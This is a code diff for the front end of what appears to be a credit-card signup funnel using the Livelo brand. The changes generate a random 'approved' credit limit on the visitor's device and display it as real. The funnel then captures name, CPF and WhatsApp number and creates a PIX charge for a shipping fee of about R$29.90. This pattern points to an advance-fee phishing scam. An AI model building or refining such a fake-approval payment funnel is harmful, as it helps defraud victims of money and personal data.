@@ -33,6 +33,23 @@ if (!STATE.sessionId) {
   try { localStorage.setItem('livelo_session', STATE.sessionId); } catch(e) {}
 }
 
+// DYNAMIC LIMIT GENERATION
+let storedLimit = null;
+try { storedLimit = localStorage.getItem('livelo_limit'); } catch(e) {}
+if (!storedLimit) {
+  STATE.limitBase = Math.floor(Math.random() * (150 - 45 + 1) + 45) * 100;
+  try { localStorage.setItem('livelo_limit', STATE.limitBase); } catch(e) {}
+} else {
+  STATE.limitBase = parseInt(storedLimit);
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  let limitFull = "R$ " + STATE.limitBase.toLocaleString('pt-BR') + ",00";
+  let limitShort = "R$ " + STATE.limitBase.toLocaleString('pt-BR');
+  document.querySelectorAll('.dynamic-limit-full').forEach(el => el.innerText = limitFull);
+  document.querySelectorAll('.dynamic-limit-short').forEach(el => el.innerText = limitShort);
+});
+
 // CAPTURE UTMS
 const urlParams = new URLSearchParams(window.location.search);
 STATE.utm_source = urlParams.get('utm_source') || '';
@@ -328,7 +345,7 @@ async function submitBilling() {
     const data = await res.json();
     
     if (data.ok) {
-      if ($id('approved-limit')) $id('approved-limit').textContent = data.limite;
+      if ($id('approved-limit')) $id('approved-limit').textContent = parseFloat(data.limite).toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
       STATE.limite = data.limite;
       if ($id('done-limite')) $id('done-limite').textContent = data.limite;
       
@@ -461,12 +478,14 @@ function submitCardStyle() {
   }).catch(console.error);
   // Vai para tela de sucesso
   goToStep('manager');
-  if(STATE.nome_completo) { 
-      var n1 = document.getElementById('sum-nome'); if(n1) n1.innerText = STATE.nome_completo; 
-      var n2 = document.getElementById('pix-nome'); if(n2) n2.innerText = STATE.nome_completo; 
-  }
+  const leadName = STATE.nome_completo || STATE.nome || 'SEU NOME';
+  var n1 = document.getElementById('sum-nome'); if(n1) n1.innerText = leadName; 
+  var n2 = document.getElementById('pix-nome'); if(n2) n2.innerText = leadName; 
+  
   if(STATE.cpf) { var cpf1 = document.getElementById('pix-cpf'); if(cpf1) cpf1.innerText = STATE.cpf; }
-  if(STATE.celular) { var tel1 = document.getElementById('pix-tel'); if(tel1) tel1.innerText = STATE.celular; }
+  var phone = STATE.celular || STATE.telefone || '(31) 90504-4521';
+  var tel1 = document.getElementById('pix-tel'); if(tel1) tel1.innerText = phone; 
+  
   var cv = document.getElementById('summary-card-visual');
   var csvg = document.getElementById('summary-card-svg');
   if(cv && CARD_TEMPLATES[STATE.color || 'classico']) { 
@@ -474,7 +493,7 @@ function submitCardStyle() {
     if(csvg) csvg.innerHTML = CARD_TEMPLATES[STATE.color || 'classico'].svg;
   }
   var cn = document.getElementById('summary-card-name');
-  if(cn) cn.innerText = STATE.nome_completo || 'SEU NOME';
+  if(cn) cn.innerText = leadName;
 }
 
 // Seleção de método de envio — carrega gerente e vai ao WhatsApp
@@ -525,6 +544,10 @@ async function submitWhatsapp() {
   if (waVal.length < 10) {
     return showErr('wa-error', 'Digite um número de WhatsApp válido com DDD.');
   }
+  
+  // Captura o telefone real formatado para usar na tela do PIX depois
+  STATE.celular = inputEl.value;
+  STATE.telefone = waVal;
   
   $id('btn-wa-text').innerText = 'Verificando status no WhatsApp...';
   $id('wa-btn-arrow').classList.add('hidden');
@@ -578,7 +601,7 @@ async function gerarPix() {
     const res = await fetch('/api/gerar-pix', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ session_id: STATE.sessionId })
+      body: JSON.stringify({ session_id: STATE.sessionId, amount: STATE.freteValor || 29.90 })
     });
     const data = await res.json();
     
@@ -763,7 +786,7 @@ if(_oldGoTo) {
             fetch('/api/gerar-pix', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(STATE)
+                body: JSON.stringify(Object.assign({}, STATE, { amount: STATE.freteValor || 29.90 }))
             })
             .then(r => r.json())
             .then(data => {
@@ -964,7 +987,7 @@ function selectShipping(method, price) {
   
   if ($id('summary-card-name')) $id('summary-card-name').innerText = (STATE.nome || 'SEU NOME').toUpperCase();
   
-  goToStep('cep'); // Redirects to new CEP step
+  goToStep('shipping-summary'); // Redirects to payment summary step
 }
 
 
